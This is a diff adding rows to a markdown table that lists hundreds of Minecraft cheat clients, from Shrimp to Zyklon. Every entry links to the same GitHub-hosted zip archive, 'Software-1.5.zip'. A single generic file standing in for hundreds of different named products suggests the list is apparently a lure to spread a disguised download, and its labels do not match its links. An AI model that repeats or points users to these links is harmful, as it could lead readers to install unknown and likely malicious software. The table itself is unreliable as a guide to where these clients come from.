+| Shrimp              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                      |
+| ShrimpHack | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| SigamWare.CC        | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| Sigma               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                     |
+| Sikiskenkurt.CC | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Silence             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip             |
+| Sirius              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| Skid+ / SkidPlus    | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip          |
+| SkidBounce | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Skidcraft           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Skidd.ed / Skidded  | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| SkidwareMC          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| Skill               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| SkilledClient       | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| Skuxx               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                |
+| Slack | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Sleek               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip             |
+| Slinky.gg | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Sloth | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Slu.gg / SluGG      | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| SlugClient          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| SmartClient         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip            |
+| Smok | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| SMPHack | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Sn0w                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| $now / Snow | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Snow                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                  |
+| SnowFallWare        | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| SodaWare | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| SolClient           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                    |
+| Sorus               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                            |
+| SovietWare          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                    |
+| Spark               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Spark               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                        |
+| SpectClient         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| Spicy | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| SpiderSense         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip         |
+| SplashClient | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Spoon | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Stay                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| StayPro             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Stifle              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                       |
+| Styles | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Storm | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Sudo                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| Strafehack          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| Sugoma              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| Sukumi | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Summit              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Summit+ / SummitPlus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                |
+| SumoClient          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Sunshine | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Supermacy           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Sushi               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip          |
+| Sushi.cc v2         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Sydney | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Syracuse            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| System | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Sweet / Sweet+ / SweetPlus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| Swift               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip       |
+| Tarasande | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Target              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| TaterGod.cc         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip          |
+| TeddyWare           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip      |
+| Temple | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Tenacity            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Tensor              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                      |
+| Tesla               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| THSense             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip          |
+| Theresa             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| Thesame.space       | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| ThunderHack+ / ThunderHackPlus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| ThunderHack Deluxe | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| ThunderHack Recode | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Toast               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| Tokyo               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| Tomato              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                     |
+| Toxic.club          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                    |
+| TransWare           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| TrapClient          | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| Trinity             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| Trinity+ / TrinityPlus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| TrollGod.cc / RealthClient | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Trollhack           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                   |
+| Troxill             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| TurcoHack.cc        | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| Turok               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                     |
+| TuxHack             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                      |
+| Uranium             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                        |
+| Urmomia             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip               |
+| Uop.cc | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| UwUGod | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| UZI | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| UZI Client | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Vanadium | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Vape V4 / VapeV4 | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Vapid               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                    |
+| Vector              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip         |
+| VectorClient | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Vegaline | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Velocity            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| VenHack             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                        |
+| VenomHack           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip   |
+| Vertex              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                |
+| Vertine             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                |
+| VeteranHack         | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip  |
+| VetHack             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Viagra | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Violet              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                        |
+| Virgin | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Volt | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Vonware | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Vox                 | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                       |
+| VydraHack | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Vrpos               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                     |
+| VyperHax            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                     |
+| W1seHack            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip         |
+| Walksy | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| WebHack             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Warden | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| WeepCraft           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| WaizyHack           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Walksy | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| WDNC | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| WetHack             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| WexSide             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| WhiskerZ            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                     |
+| Wild                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                               |
+| Windy               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip            |
+| Wing Client | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Winter              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                        |
+| WintWare            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip        |
+| WizClient | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| WOO                 | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                  |
+| Wonderwhale.ng | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| WubzMod             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                       |
+| Wurst- / WurstMinus | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip         |
+| Wurst+1 / WurstPlusOne | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                  |
+| Wurst+2 / WurstPlusTwo | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| Wurst+3 / WurstPlusThree | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| Wurst+4 / WurstPlusFour | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip              |
+| Xanax               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| Xannax              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip   |
+| Xatzotica           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| Xdolf               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                        |
+| Xeno                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Xenophyre           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                    |
+| XG42                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Xl Client | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| XSWare              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip             |
+| Xulu                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Xulu+ / XuluPlus    | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                  |
+| Xyla | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Yasashii            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip       |
+| Yee                 | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| YoinkHack           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip             |
+| Zamorozka           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Zelix               | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip            |
+| ZenGit              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip        |
+| Zenith              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip   |
+| Zenith | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Zeon                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                 |
+| ZeroDay             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                                    |
+| ZeroHack            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                  |
+| ZeroTwo             | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip          |
+| Zeus                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                         |
+| Zinc                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip       |
+| Zirconium           | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip           |
+| Zispanos            | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip   |
+| Zodiac              | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip                     |
+| Zori                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip         |
+| Zork                | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip             |
+| ZSpaceHack | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| ZWare.CC | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip // https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
+| Zyklon | https://github.com/rykr32/CHEATS/raw/refs/heads/main/anaconda/Software-1.5.zip |
 
 ## Disclaimer
 
